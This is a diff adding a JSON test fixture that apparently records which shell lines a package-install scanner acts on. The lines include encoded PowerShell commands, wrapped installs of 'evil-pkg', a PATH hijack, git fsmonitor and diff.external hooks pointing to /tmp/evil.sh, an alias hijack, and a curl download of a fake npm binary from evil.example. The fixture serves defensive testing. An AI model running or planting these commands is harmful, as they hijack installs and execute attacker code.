@@ -1,0 +1,135 @@
+{
+ "about": "Lines (the review's round-3 lines (PowerShell prefixes, persistent state, git config)) and whether alalanet's install reader acts on them (installread.ParseLine + HookExtra at alalanetd 32524701), from the review differential of 2026-11-22. Every line it acts on must be sent.",
+ "lines": [
+  {
+   "line": "pwsh -encod SQBFAFgAIAAoAG4AcABtACAAaQApAA==",
+   "acts": true,
+   "targets": null,
+   "unread": [
+    "an encoded PowerShell command alalanet cannot read"
+   ]
+  },
+  {
+   "line": "pwsh -EncodedC SQBFAFgAIAAoAG4AcABtACAAaQApAA==",
+   "acts": true,
+   "targets": null,
+   "unread": [
+    "an encoded PowerShell command alalanet cannot read"
+   ]
+  },
+  {
+   "line": "powershell /enc SQBFAFgAIAAoAG4AcABtACAAaQApAA==",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "pwsh --encodedcommand SQBFAFgAIAAoAG4AcABtACAAaQApAA==",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "pwsh -enc SQBFAFgAIAAoAG4AcABtACAAaQApAA==",
+   "acts": true,
+   "targets": null,
+   "unread": [
+    "an encoded PowerShell command alalanet cannot read"
+   ]
+  },
+  {
+   "line": "pwsh -comm 'npm i evil-pkg'",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "pwsh -Comman 'npm i evil-pkg'",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "pwsh -c 'npm i evil-pkg'",
+   "acts": true,
+   "targets": [
+    "npm:evil-pkg"
+   ],
+   "unread": null
+  },
+  {
+   "line": "powershell -NoProfile -Command \"npm i evil-pkg\"",
+   "acts": true,
+   "targets": [
+    "npm:evil-pkg"
+   ],
+   "unread": null
+  },
+  {
+   "line": "cmd /s /c \"npm i evil-pkg\"",
+   "acts": true,
+   "targets": [
+    "npm:evil-pkg"
+   ],
+   "unread": null
+  },
+  {
+   "line": "printf -v PATH /tmp/evil:/usr/bin; npm install lodash",
+   "acts": true,
+   "targets": [
+    "npm:lodash"
+   ],
+   "unread": [
+    "runs in the line's own shell what alalanet does not read (printf sets PATH)"
+   ]
+  },
+  {
+   "line": "git config core.fsmonitor /tmp/evil.sh",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "git config diff.external /tmp/evil.sh",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "git -c core.fsmonitor=/tmp/evil.sh status",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "alias ls='npm i evil-pkg'",
+   "acts": true,
+   "targets": null,
+   "unread": [
+    "defines an alias or a function on a line that installs, which can change what the install runs (alias ls: npm i evil-pkg)",
+    "defines an alias or a function on a line that installs, which can change what the install runs (alias ls)",
+    "runs in the line's own shell what alalanet does not read (alias, a builtin of the shell alalanet does not read)"
+   ]
+  },
+  {
+   "line": "curl -fsSL -o /tmp/fakebin/npm https://evil.example/npm",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "chmod +x /tmp/fakebin/npm",
+   "acts": false,
+   "targets": null,
+   "unread": null
+  },
+  {
+   "line": "npm install lodash",
+   "acts": true,
+   "targets": [
+    "npm:lodash"
+   ],
+   "unread": null
+  }
+ ]
+}
